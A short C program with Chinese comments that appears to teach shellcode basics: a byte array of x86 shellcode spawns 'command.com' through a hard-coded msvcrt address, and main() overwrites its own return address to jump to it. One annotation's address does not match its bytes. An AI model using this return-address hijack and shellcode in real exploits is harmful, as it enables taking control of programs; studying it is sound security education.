#include <windows.h>
#include <winbase.h>
char shellcode[] = {
      0x8B,0xE5,                    /*mov esp, ebp               */
      0x55,                         /*push ebp                   */
      0x8B,0xEC,                    /*mov ebp, esp               */
      0x83,0xEC,0x0C,               /*sub esp, 0000000C          */
      0xB8,0x63,0x6F,0x6D,0x6D,     /*mov eax, 6D6D6F63          */

      0x89,0x45,0xF4,               /*mov dword ptr [ebp-0C], eax*/
      0xB8,0x61,0x6E,0x64,0x2E,     /*mov eax, 2E646E61          */

      0x89,0x45,0xF8,               /*mov dword ptr [ebp-08], eax*/
      0xB8,0x63,0x6F,0x6D,0x22,     /*mov eax, 226D6F63          */

      0x89,0x45,0xFC,               /*mov dword ptr [ebp-04], eax*/
      0x33,0xD2,                    /*xor edx, edx               */
      0x88,0x55,0xFF,               /*mov byte ptr [ebp-01], dl  */
      0x8D,0x45,0xF4,               /*lea eax, dword ptr [ebp-0C]*/
      0x50,                         /*push eax                   */
      0xB8,0x44,0x80,0xbf,0x77,     /*mov eax, 78019824          */

      0xFF,0xD0                     /*call eax                   */
};

int main() {
   int *ret;
   LoadLibrary("msvcrt.dll");

   ret = (int *)&ret + 2;       //ret 等于main（）的返回地址
                                //(＋2是因为：有push ebp ,否则加1就可以了。）
   (*ret) = (int)shellcode;     //修改main（）的返回地址为shellcode的开始地址。

}
